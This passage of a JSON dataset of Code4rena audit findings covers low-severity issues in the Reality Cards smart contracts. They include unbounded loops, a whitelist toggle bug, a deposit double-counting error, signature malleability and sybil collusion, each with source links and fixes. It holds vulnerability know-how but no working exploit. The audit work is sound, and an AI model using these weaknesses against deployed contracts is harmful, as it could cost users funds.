      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "329",
      "title": "[L-22] Unbounded iteration on _cardAffiliateAddresses",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe `Factory.createMarket` iterates over all `_cardAffiliateAddresses`.\n\n## Impact\n\nThe transactions can fail if the arrays get too big and the transaction would consume more gas than the block limit.\nThis will then result in a denial of service for the desired functionality and break core functionality.\n\n\n## Recommended Mitigation Steps\n\nPerform a `_cardAffiliateAddresses.length == 0 || _cardAffiliateAddresses.length == tokenUris.length` check in `createMarket` instead of silently skipping card affiliate cuts in `Market.initialize`.\nThis would restrict the `_cardAffiliateAddresses` length to the `nftMintingLimit` as well.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/154",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "328",
      "title": "[L-21] RCTreasury.addToWhitelist() will erroneously remove user from whitelist if user is already whitelisted",
      "impact": "LOW",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\nRCTreasury.addToWhitelist() will erroneously remove user from whitelist if user is already whitelisted\n\n## Impact\n\nThe comments state that calling addToWhitelist() should add a user to the whitelist. [1]\n\nHowever, since the implementation simply flips the user's whitelist bool, if the user is already on the whitelist, then calling addToWhitelist() will actually remove them from the whitelist. [2]\n\nSince batchAddToWhitelist() will repeatedly call addToWhitelist() with an entire array of users, it is very possible that someone could inadvertently call addToWhitelist twice for a particular user, thereby leaving them off of the whitelist. [3] \n\n## Proof of Concept\n\nIf a governor calls addToWhitelist() with the same user twice, the user will not be added to the whitelist, even though the comments state that they should.\n\n## Recommended Mitigation Steps\n\nChange addToWhitelist to only ever flip a user's bool to true. To clarify the governor's intention, create a corresponding removeFromWhitelist and batchRemoveFromWhitelist which flip a user's bool to false, so that the governor does not accidently remove a user when intending to add them. \n\nChange this:\n\nisAllowed[_user] = !isAllowed[_user]; // [4]\n\nTo this:\n\nisAllowed[_user] = true; // [4]\n\nAnd add this:\n\n    /// @notice Remove a user to the whitelist\n    function removeFromWhitelist(address _user) public override {\n        IRCFactory factory = IRCFactory(factoryAddress);\n        require(factory.isGovernor(msgSender()), \"Not authorised\");\n        isAllowed[_user] = false;\n    }\n\n    /// @notice Remove multiple users from the whitelist\n    function batchRemoveFromWhitelist(address[] calldata _users) public override {\n        for (uint256 index = 0; index < _users.length; index++) {\n            removeFromWhitelist(_users[index]);\n        }\n    }\n\n\n[1] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L209\n\n[2] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L213\n\n[3] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L217\n\n[4] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L213",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/49",
      "tags": [],
      "finders": [
        "0xRajeev  [s1m0](https://twitter.com/smonica)",
        "jvaqa"
      ]
    },
    {
      "id": "327",
      "title": "[L-20] totalNftMintCount can be replaced with ERC721 totalSupply()",
      "impact": "LOW",
      "content": "## Handle\n\npauliax\n\n\n## Vulnerability details\n\n## Impact\nI can't find a reason why totalNftMintCount in Factory can't be replaced with ERC721 totalSupply() to make it less error-prone. As nfthub.mint issues a new token it should automatically increment totalSupply and this assignment won't be needed:\n      totalNftMintCount = totalNftMintCount + _tokenURIs.length;\nAlso in function setNftHubAddress you need to manually set _newNftMintCount if you want to change nfthub so an invalid value may crash the system. totalSupply() will eliminate totalNftMintCount and make the system more robust.\n\n## Recommended Mitigation Steps\nReplace totalNftMintCount with nfthub totalSupply() in Factory contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/134",
      "tags": [],
      "finders": [
        "paulius.eth"
      ]
    },
    {
      "id": "326",
      "title": "[L-19] Shadowing Local Variables found in RCOrderbook.sol",
      "impact": "LOW",
      "content": "## Handle\n\nmaplesyrup\n\n\n## Vulnerability details\n\n## Impact\n1 - Low Risk\n   - Possible incorrect use of variables are at stake which may have bad side effects to the contract if implemented incorrectly.\n\n## Proof of Concept\n\nAccording to the Slither-analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#local-variable-shadowing), shadowing local variables is naming conventions found in two or more variables that are similar. Although they do not pose any immediate risk to the contract, incorrect usage of the variables is possible and can cause serious issues if the developer does not pay close attention. \n\nIt is recommended that the naming of the following variables should be changed slightly to avoid any confusion:\n\n -------------------------------------------------------------------\n\nRCOrderbook._updateBidInOrderbook(address,address,uint256,uint256,uint256,RCOrderbook.Bid)._owner \n\n(contracts/RCOrderbook.sol line(s)#358) shadows:\n\nOwnable._owner <------(state variable)\n\n(node_modules/@openzeppelin/contracts/access/Ownable.sol line(s)#19) \n\n -------------------------------------------------------------------\n\nRCOrderbook.closeMarket()._owner \n\n(contracts/RCOrderbook.sol line(s)#639) shadows:\n\nOwnable._owner <------(state variable)\n\n(node_modules/@openzeppelin/contracts/access/Ownable.sol line(s)#19)\n\n -------------------------------------------------------------------\n\n## Tools Used\n\nSolidity Compiler 0.8.4\nHardhat v2.3.3\nSlither v0.8.0\n\nCompiled, Tested, Deployed contracts on a local hardhat network.\n\nRan Slither-analyzer for further detecting and testing.\n\n## Recommended Mitigation Steps\n\n(Worked best under python venv)\n1. Clone Project Repository\n2. Run Project against Hardhat network;\n   compile and run default test on contracts.\n3. Installed slither analyzer:\n  https://github.com/crytic/slither\n4. Ran [$ slither .] against RCOrderbook.sol and all contracts to verify results",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/124",
      "tags": [],
      "finders": [
        "maplesyrup (heiho1  thisguy__)"
      ]
    },
    {
      "id": "325",
      "title": "[L-18] Test function left behind can expose order book",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe getBid() order book function is noted in its Natspec @dev comments as “@dev just to pass old tests, not needed otherwise @dev to be deleted once tests updated” but is left behind here.\n\nThis function could externally expose orderbook ordering (prev/next linked list) for malicious contracts to potentially time or price bids to its advantage.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCOrderbook.sol#L807-L827\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nRemove function as noted.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/101",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "324",
      "title": "[L-17] exitedTimestamp set prematurely",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe exitedTimestamp flag is used to prevent front-running of user exiting and re-entering in the same block. The setting of this flag in exit() should really be inside the conditionals and triggered only if current owner or if bidExists. It currently assumes that either of the two will always be true which may not necessarily be the case.\n\nImpact: A user accidentally exiting a card he doesn't own or have a bid for currently will be marked as exited and prevented from a newRental in the same block. User can prevent one's own newRental from succeeding, because it was accidentally triggered, by front-running it himself with an exit. There could be other more realistic scenarios.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L784-L804\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L56-L57\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L678-L681\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nSet exitedTimestamp flag only when the conditionals are true within exit()",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/91",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "323",
      "title": "[L-16] Assert indicates unnecessary check or missing constraint/logic",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nupdateLastRentalTime() function “tracks when the user last rented so they cannot rent and immediately withdraw thus bypassing minimum rental duration.”\n\nThis function currently always returns true and so there is no need to assert its return value, as done in newRental(), unless it was meant to return false in some scenarios which indicates missing constraint/logic. It is not clear what that might be.\n\nImpact: Given that the minimum rental duration is one of the two key protection mechanisms, any missing logic/constraint here could affect the project significantly.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L731\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L484-L498\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nValidate constraint/logic to see if function should return false in any scenario. Remove assert at call site if otherwise.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/90",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "322",
      "title": "[L-15] Missing market open check",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nMissing _checkState(States.OPEN) on first line of rentAllCards() as specified on L617. These core market functions are supposed to operate only when market is open but the missing check allows control to proceed further in the control flow. In this case, the function proceeds to call newRental() which has a conditional check state == States.OPEN and silently returns success otherwise, without reverting.\n\nImpact: rentAllCards does not fail if executed when market is closed or locked. newRental returns silently without failure when market is closed or locked.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L617\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L637-L658\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L672\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd a require() to check market open state in the beginning of all core market functions and revert with an informative error string otherwise.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/86",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "321",
      "title": "[L-14] Misplaced zero-address check",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nMisplaced zero-address check for nfthub on L595 in createMarket() because nfthub cannot be 0 at this point as nfthub.addMarket() on L570 would have already reverted if that were the case.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L570\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L595\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nMove nfthub zero-address check to before the call to nfthub.addMarket().",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/82",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "320",
      "title": "[L-13] Susceptible to collusion and sybil attacks",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nCollusion and sybil attacks are general problems with blockchain-based prediction markets and voting systems. \n\nCollusion between market creator and bidders, where the creator creates a niche prediction market for which only they know the outcome with a higher degree of probability (than others) and either spawn fake users (sybils) to increase the pot size and lure victims to add bids. Creator or its fake users maintain the longest duration on the winning outcome (which they know with greater certainty than others) thus winning that market’s outcome and taking the victim's rents (winner-take-all-mode).\n\n## Proof of Concept\n\nhttps://en.wikipedia.org/wiki/Sybil_attack\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nThe general problem is hard to solve. Document and warn users suitably about risks involved.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/79",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "319",
      "title": "[L-12] Making isMarketApproved False on an operational market will lock NFTs to L2",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nOnce market is approved and operational, changing approval to false should not be allowed or else it will prevent NFTs from being withdrawn to mainnet. All other Governor controlled variables are used during market creation and not thereafter, except this one. The other onlyGovernors functions only affect state before market creation but this one affects after creation.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L382-L391\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L326-L330\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nOnce market is approved and operational, changing approval to false should not be allowed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/76",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "318",
      "title": "[L-11] isGovernor excludes Factory owner",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIn the Factory contract, the Factory owner is authorized to change approval for governor addresses and is also treated as a governor in the modifier onlyGovernors. However, isGovernor modifier excludes Factory owner as a governor for some reason. This function is used only by Treasury to whitelist users who can deposit tokens and would make sense to include Factory owner as a governor to be consistent.\n\nWithout doing so, Factory owner cannot whitelist users without adding itself or someone else as a governor.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L360-L365\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L181-L188\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L212\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nInclude Factory owner in isGovernor().",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/75",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "317",
      "title": "[L-10] Missing input validation on timeout",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nFactory constructor sets timeout to 86400 seconds but setter setTimeout() has no threshold checks for a min timeout value. If this is accidentally set to 0 or lower-than-safe value then there is no dispute window and users lose confidence in market.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L137\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L299-L303\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd input validation for threshold checks on both low and high ends.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/74",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "316",
      "title": "[L-09] Basis points usage deviates from general definition",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe general definition of basis points is 100 bps = 1%. The usage here, 1000 bps = 100%, deviates from generally accepted definition and could cause confusion among users/creators/affiliates or potential miscalculations.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L228\n\nhttps://www.investopedia.com/terms/b/basispoint.asp\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nDocument the used definition of basis points or switch to the generally accepted definition.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/72",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "315",
      "title": "[L-08] NFT minting limit dependence on block gas limit",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe current block gas limit is 15M and not 12.5 as indicated in the comment for setNFTMintingLimit(60) in Factory’s constructor. So this could be changed accordingly but a safe threshold needs to be enforced in the setter setNFTMintingLimit() which is currently lacking. That would prevent accidentally setting the minting limit to something beyond what the block gas limit would safely allow.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L132\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L267-L272\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nIf NFT minting limit dependence on block gas limit is critical to the functioning, consider using GASLIMIT opcode to dynamically check block gas limit to set nftMintingLimit appropriately before creating a market.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/70",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "314",
      "title": "[L-07] Use of ecrecover is susceptible to signature malleability",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe ecrecover function is used to verify and execute Meta transactions. The built-in EVM precompile ecrecover is susceptible to signature malleability (because of non-unique s and v values) which could lead to replay attacks (references: https://swcregistry.io/docs/SWC-117, https://swcregistry.io/docs/SWC-121 and https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57). \n\nWhile this is not exploitable for replay attacks in the current implementation because of the use of nonces, this may become a vulnerability if used elsewhere.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/lib/NativeMetaTransaction.sol#L99-L104\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/lib/NativeMetaTransaction.sol#L38-L48\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nConsider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/cryptography/ECDSA.sol",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/66",
      "tags": [],
      "finders": [
        "0xRajeev",
        "[adlamo](https://twitter.com/a_delamo)_"
      ]
    },
    {
      "id": "313",
      "title": "[L-06] unnecessary emit of LogUserForeclosed",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function deposit of RCTreasury.sol resets the isForeclosed state and emits LogUserForeclosed, if the use have enough funds.\nHowever this also happens if the user is not Foreclosed and so the emit is redundant and confusing.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L279\nfunction deposit(uint256 _amount, address _user) public override balancedBooks returns (bool) {\n   ....\n        // this deposit could cancel the users foreclosure\n        if ( (user[_user].deposit + _amount) > (user[_user].bidRate / minRentalDayDivisor) ) {\n            isForeclosed[_user] = false;\n            emit LogUserForeclosed(_user, false);\n        }\n        return true;\n    }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nOnly do the emit when isForeclosed was true",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/27",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "312",
      "title": "[L-05] Deposit double-counting miscalculation could incorrectly prevent user foreclosure",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIn the deposit function, the deposit _amount has already been added to the user's deposit on L303. The addition of _amount again to the deposit on L309 for checking against daily bidRate effectively leads to double counting of deposited _amount and may keep/bring user out of foreclosure even though they are not.\n\n## Proof of Concept\n\nScenario: Alice’s current daily bidRate is 500 and deposit is 350. She makes a new deposit of 100 which should not bring her out of foreclosure because the new effective deposit will be 300+150 = 450 which is still less than 500. However, because of the double-counting miscalculation, the check performed is 450+100 > 500 which will pass and Alice is not foreclosed. She effectively gains double the deposit amount in treatment of deposits against foreclosure.\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L279\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L303\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L308-L314\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nChange the conditional predicate on L309-310 from:\nuser[_user].deposit + _amount > user[_user].bidRate / minRentalDayDivisor\nto:\nuser[_user].deposit > user[_user].bidRate / minRentalDayDivisor",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/108",
      "tags": [],
      "finders": [
        "0xRajeev",
        "paulius.eth  shw",
        "gpersoon"
      ]
    },
    {
      "id": "311",
      "title": "[L-04] addToWhitelist doesn’t check factoryAddress",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function addToWhitelist of RCTreasury.sol does a call to the factory contract, however the factoryAddress might not be initialized, because it is set via a different function\n(setFactoryAddress).\nThe function addToWhitelist will revert when it calls a 0 address, but it might be more difficult to troubleshoot.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L233\n   function setFactoryAddress(address _newFactory) external override {\n        ...\n        factoryAddress = _newFactory;\n    }\n\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L210\n    function addToWhitelist(address _user) public override {\n        IRCFactory factory = IRCFactory(factoryAddress);\n        require(factory.isGovernor(msgSender()), \"Not authorised\");\n        isAllowed[_user] = !isAllowed[_user];\n    }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nVerify that factoryAddress is set in the function addToWhitelist, for example using the following code.\n require(factory != address(0), \"Must have an address\");",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/24",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "310",
      "title": "[L-03] Multiple calls necessary for getWinnerFromOracle",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nSometimes multiple calls necessary to getWinnerFromOracle are necessary to get the _winningOutcome  to be processed:\n- getWinnerFromOracle calls setWinner \n- setWinner calls lockMarket\n- lockMarket calls collectRentAllCards\n- collectRentAllCards can return false, which means is has to be called again. In that case the _winningOutcome isn't processed and getWinnerFromOracle has to be called again.\n\nIt's not easy to determine how many times getWinnerFromOracle has to be called.\n(it can be seen via emit LogWinnerKnown(winningOutcome), however this cannot be read from a smart contract)\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L464\n    function setWinner(uint256 _winningOutcome) internal {\n        if (state == States.OPEN) {\n            // change the locking time to allow lockMarket to lock\n            marketLockingTime = SafeCast.toUint32(block.timestamp);\n            lockMarket();\n        }\n        if (state == States.LOCKED) {\n            // get the winner. This will revert if answer is not resolved.\n            winningOutcome = _winningOutcome;\n            _incrementState();\n            emit LogWinnerKnown(winningOutcome);\n        }\n    }\n\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L441\n  function lockMarket() public { \n      ...\n        if (collectRentAllCards()) {\n            ....\n            _incrementState();\n             ...\n        }\n    }\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nLet the function getWinnerFromOracle return a boolean to indicate it has to be called again.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/12",
      "tags": [],
      "finders": [
        "0xRajeev",
        "gpersoon"
      ]
    },
    {
      "id": "309",
      "title": "[L-02] Lack of zero address validation ",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\n  constructor of RCorderbook.sol lacks zero address validation , since parameter of costructor are used initialize state variable which are used in other function of the contract , error in these state variable can lead to redeployment of contract\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCOrderbook.sol#L106\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nadd require condition to check for zero address",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/56",
      "tags": [],
      "finders": [
        "0xRajeev",
        "cmichel_",
        "maplesyrup (heiho1  thisguy__)",
        "[Jmukesh](https://twitter.com/MukeshJeth)"
      ]
    },
    {
      "id": "308",
      "title": "[L-01] Use of assert() instead of require()",
      "impact": "LOW",
